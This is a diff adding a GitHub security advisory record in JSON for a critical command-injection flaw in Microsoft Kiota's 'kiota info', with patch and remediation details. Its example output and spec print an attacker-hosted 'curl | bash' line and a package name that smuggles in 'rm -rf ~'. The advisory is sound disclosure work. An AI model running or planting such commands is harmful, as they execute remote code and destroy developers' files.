@@ -1,0 +1,62 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-07-24T16:11:48Z",
+  "Package": {
+    "Ecosystem": "NUGET",
+    "Name": "Microsoft.OpenApi.Kiota.Builder"
+  },
+  "Advisory": {
+    "DatabaseId": 391845,
+    "Id": "GSA_kwCzR0hTQS1ocTlxLTI3ZzUtcXdwas4ABfql",
+    "GhsaId": "GHSA-hq9q-27g5-qwpj",
+    "References": [
+      {
+        "Url": "https://github.com/microsoft/kiota/security/advisories/GHSA-hq9q-27g5-qwpj"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59865"
+      },
+      {
+        "Url": "https://github.com/microsoft/kiota/pull/7883"
+      },
+      {
+        "Url": "https://github.com/microsoft/kiota/commit/e1d6d76c6eecbe50785429166faaf8c831e036c6"
+      },
+      {
+        "Url": "https://github.com/microsoft/kiota/releases/tag/v1.32.5"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-hq9q-27g5-qwpj"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-hq9q-27g5-qwpj"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-59865"
+      }
+    ],
+    "Description": "### Summary\n\n`kiota info` — the command developers run to learn which packages to install after generating a client —\nread the `x-ms-kiota-info` extension from the OpenAPI description and presented the spec-supplied\n`dependencyInstallCommand` (and dependency `name`/`version`) **as the tool's own recommended install\ncommand**, replacing kiota's normally-trusted suggestion. With an attacker-controlled or compromised\ndescription:\n\n```\n$ kiota info -d \u003cattacker-spec\u003e -l CSharp\n   ...\n   Hint: use the install command to install the dependencies.\n   Example:\n      curl -s https://attacker.example/x.sh | bash   # attacker-controlled\n```\n\nA developer who followed kiota's explicit instruction (run the suggested install command) executed\nattacker-controlled shell — **command injection → RCE**. The IDE-facing `kiota info --json` output, which the\nKiota **VS Code extension** consumes to offer/run dependency installation, exposed the raw command string\ndirectly, so an \"install dependencies\" action in the IDE could run it automatically.\n\nConfirmed on Kiota **1.32.4**.\n\n### Details\n\n`x-ms-kiota-info.languagesInformation.\u003clanguage\u003e.dependencyInstallCommand` was emitted verbatim as the\ninstall-command example, and `dependencies[].name`/`version` were shown verbatim in the package table:\n\n```\n# spec\nx-ms-kiota-info:\n  languagesInformation:\n    CSharp:\n      dependencyInstallCommand: \"curl -s https://attacker.example/x.sh | bash\"\n      dependencies: [{ name: \"Evil.Pkg; rm -rf ~\", version: \"1.0.0\", type: bundle }]\n```\n\nWithout `x-ms-kiota-info`, kiota suggests its own trusted command (e.g.\n`dotnet add package Microsoft.Kiota.Authentication.Azure --version 2.0.0`); the spec's value **replaced** it.\n`kiota info --json` (consumed by the Kiota VS Code extension) emitted the attacker command in\n`dependencyInstallCommand`.\n\n### Impact\n\nA developer who ran `kiota info` on an attacker-controlled or compromised OpenAPI description and followed\nkiota's instruction to run the suggested install command executed arbitrary shell on their workstation or CI\nhost. The Kiota VS Code extension, which surfaced/ran `dependencyInstallCommand` from the `--json` output,\ncould make this automatic. CWE-94 / CWE-829.\n\nPrecondition: the description is from an untrusted source (or a trusted one that was tampered with), and the\nrecommended command is run (manually per kiota's hint, or by the IDE).\n\n### Patches\n\nFixed in **1.32.5** (https://github.com/microsoft/kiota/pull/7883). Support for the spec-supplied\n`dependencyInstallCommand` in `x-ms-kiota-info` was **removed** entirely: `kiota info` no longer reads or\npresents a description-provided install command and only surfaces kiota's own built-in, package-manager\ntemplates. The `--json` output no longer carries a spec-controlled command string for the IDE to run.\n\n### Remediation\n\nUpgrade to Kiota **1.32.5** or later. Update the Kiota VS Code extension to a version built against 1.32.5+.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-07-24T16:11:46Z",
+    "Severity": "CRITICAL",
+    "Summary": "Microsoft Kiota: Command injection via x-ms-kiota-info dependencyInstallCommand surfaced by `kiota info`",
+    "UpdatedAt": "2026-07-24T16:11:48Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.32.5"
+      },
+      "VulnerableVersionRange": "\u003c 1.32.5"
+    }
+  ]
+}
